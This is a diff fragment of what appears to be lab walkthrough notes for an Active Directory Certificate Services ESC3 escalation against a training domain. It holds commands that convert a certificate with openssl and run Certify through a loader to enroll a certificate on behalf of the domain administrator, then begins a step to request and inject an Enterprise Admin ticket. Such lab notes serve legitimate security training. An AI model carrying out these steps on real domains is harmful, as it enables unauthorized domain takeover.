@@ -27,12 +27,12 @@ C:\Users\Public\Loader.exe -path C:\Users\Public\Certify.exe -args request /ca:m
 
 Convert from `cert.pem` to `esc3.pfx` 
 ```powershell
-C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3.pfx
+C:\Users\Public\openssl\openssl.exe pkcs12 -in C:\Users\Public\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\Users\Public\esc3.pfx
 ```
 
 Use `esc3.pfx` to request a certificate on behalf of EA using the `SmartCardEnrollment-Users` template
 ```powershell
-C:\Users\Public\Loader.exe -path C:\Users\Public\Certify.exe -args  request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3.pfx /enrollcertpw:Pwned123!
+C:\Users\Public\Loader.exe -path C:\Users\Public\Certify.exe -args request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3.pfx /enrollcertpw:Pwned123!
 ```
 
 Request EA TGT and inject it
